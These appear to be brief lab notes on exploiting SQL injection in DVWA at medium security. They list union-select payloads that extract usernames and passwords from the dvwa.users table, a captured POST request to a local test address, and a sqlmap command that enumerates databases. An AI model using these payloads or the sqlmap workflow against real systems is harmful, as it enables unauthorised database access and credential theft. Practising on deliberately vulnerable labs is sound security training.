

sql injeciton medium vulnerability : ----------------------------

1'

%' or '0'='0' union select user, password from dvwa.users #

% or 0=0 union select user, password from dvwa.users #

1 or 0=0 union select user, password from dvwa.users #


method 2 : -

1'

%' or '0' = '0

1 UNION SELECT null, version() 



using sqlmap save post request in file.txt



POST /vulnerabilities/sqli/ HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 18
Origin: http://172.17.0.2
Connection: close
Referer: http://172.17.0.2/vulnerabilities/sqli/
Cookie: lang=en-US; PHPSESSID=deanteiid9ignilfjtiak17op2; security=medium
Upgrade-Insecure-Requests: 1
i_like_gitea: 11session

id=1&Submit=Submit




next is to run sqlmap 

sqlmap -r r.txt --dbs

